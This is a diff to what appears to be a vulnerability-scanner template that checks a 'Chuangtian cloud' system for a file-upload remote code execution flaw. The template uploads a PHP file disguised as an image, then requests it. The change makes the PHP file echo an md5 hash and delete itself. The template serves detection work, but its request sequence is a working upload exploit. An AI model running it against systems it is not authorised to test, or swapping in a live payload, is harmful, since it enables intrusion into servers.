@@ -14,6 +14,8 @@ info:
   metadata:
     max-request: 2
   tags: rce,fileupload,intrusive,cloud,chuangtian
+variables:
+  string: "core-chuangtian-cloud-rce"
 
 http:
   - raw:
@@ -29,17 +31,15 @@ http:
         Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
         Content-Type: image/avif
 
-        <?php echo md5("core-chuangtian-cloud"); ?>
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
         ------WebKitFormBoundaryfcKRltGv--
       - |
         GET /Upload/test/{{randstr}}.php HTTP/1.1
         Host: {{Hostname}}
 
     matchers:
-      - type: dsl
-        dsl:
-          - 'contains(body_2, "f0a712e2bcf99c5b0c370b3a4286bb35")'
-          - 'status_code_2 == 200'
-        condition: and
-
-# digest: 4a0a00473045022066f84a24609e8aff18468dae4751d89b3367da8fbc9482995f7e6a21e3ae3795022100d4a6ce892231c551e62bdf99206ef5fad32891d92eea97c3d5bfd5ff5afc21eb:922c64590222798bb761d5b6d8e72950
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 4b0a00483046022100847a24e09b558135796cc3f1f6e6c844a35e4225b87601f50c1f67de5f8d3bc3022100ff20c6a7936c073d63fe9b741fa551558dd8ce217e9210cbbe979bc5d81038a0:922c64590222798bb761d5b6d8e72950
